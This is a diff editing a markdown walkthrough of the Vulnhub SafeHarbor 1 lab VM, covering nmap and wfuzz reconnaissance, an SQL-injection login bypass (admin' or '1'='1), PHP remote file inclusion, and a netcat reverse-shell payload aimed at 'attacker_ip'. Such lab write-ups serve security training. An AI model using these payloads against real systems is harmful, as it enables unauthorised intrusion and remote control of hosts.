@@ -20,19 +20,19 @@ As mentioned in the description the VM works well on VirtualBox, I tried Vmware 
 
 **Service discovery scan:**
 
-```diff
+```sh
 $ sudo nmap -sS -sV -Pn 192.168.1.21 -A 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-16 10:47 EDT
 Nmap scan report for 192.168.1.21
 Host is up (0.0046s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
-+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+**22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)**
 | ssh-hostkey: 
 |   2048 fc:c6:49:ce:9b:54:7f:57:6d:56:b3:0a:30:47:83:b4 (RSA)
 |   256 73:86:8d:97:2e:60:08:8a:76:24:3c:94:72:8f:70:f7 (ECDSA)
 |_  256 26:48:91:66:85:a2:39:99:f5:9b:62:da:f9:87:4a:e6 (ED25519)
-+80/tcp open  http    nginx 1.17.4
+**80/tcp open  http    nginx 1.17.4**
 | http-cookie-flags: 
 |   /: 
 |     PHPSESSID: 
@@ -60,11 +60,15 @@ Scanning well known ports gives me something to start with, the attack surface i
 
 In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster in my opinion.
 
-```
+```sh
 wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ.php -t 500
 ```
 
-Sweet, it's a login page. Let's quickly try some SQL injections on the login form fields:
+Sweet! it's a login page. 
+
+![login_page](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.png)
+
+Let's quickly try some SQL injections on the login form fields:
 
 ```
 POST / HTTP/1.1
@@ -85,6 +89,12 @@ user=';--&password=test&s=Login
 
 From the verbose errors, we can deduce that SQL injection is possible, I'm going to try some standard login bypass technique.
 
+![sqli_error](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.png)
+
+```sql
+admin' or '1'='1
+```
+
 ```
 POST / HTTP/1.1
 Host: 192.168.1.21
@@ -102,11 +112,9 @@ Upgrade-Insecure-Requests: 1
 user=admin%27+or+%271%27%3D%271&password=admin&s=Login
 ```
 
-Et voilà! That was easy, considering this was trivial I probably have a longer path to get all the flags!
+Et voilà! That was easy, considering this was trivial I probably have a longer path to get all the flags. Let's take a look at the wfuzz output:
 
-Let's take a look at the wfuzz output:
-
-```
+```sh
 root@kali:/tmp/SecLists/Discovery/Web-Content# wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ -t 500
 
 ********************************************************
@@ -120,8 +128,8 @@ Total requests: 5163
 ID           Response   Lines    Word     Chars       Payload                                                                
 ===================================================================
 
-000000029:   200        36 L     97 W     1303 Ch     "login.php"                                                            
-000000111:   200        992 L    5149 W   86320 Ch    "phpinfo.php"                                                          
+**000000029:   200        36 L     97 W     1303 Ch     "login.php"                                                            
+000000111:   200        992 L    5149 W   86320 Ch    "phpinfo.php"**                                                          
 
 Total time: 63.60388
 Processed Requests: 5163
@@ -143,7 +151,7 @@ allow_url_include On  On
 
 A quick test reveals that the parameter "p" uses include function: http://192.168.1.21/OnlineBanking/index.php?p=../../../balance
 
-```
+```html
 <br />
 <b>Warning</b>:  include(../../../balance.php): failed to open stream: No such file or directory in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />
 <br />
@@ -153,13 +161,13 @@ A quick test reveals that the parameter "p" uses include function: http://192.16
 
 Let me host a PHP file to execute the command 'id' on my Kali (attacker) box and include it to see if that works. 
 
-```
+```php
 <?php system('id'); ?>
 ```
 
 Start a web server using Python's SimpleHTTPServer:
 
-```
+```sh
 root@kali:/tmp# python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
 
@@ -167,12 +175,12 @@ Serving HTTP on 0.0.0.0 port 80 ...
 
 That worked!
 
-screenshot3
+![sqli_login_bypass](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_3.png)
 
 
 Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php)or you can achieve the same using one of the one liners below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can read up about it here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)
 
-```
+```php
 <?php system('nc attacker_ip port -e /bin/sh'); ?>
 ```
 
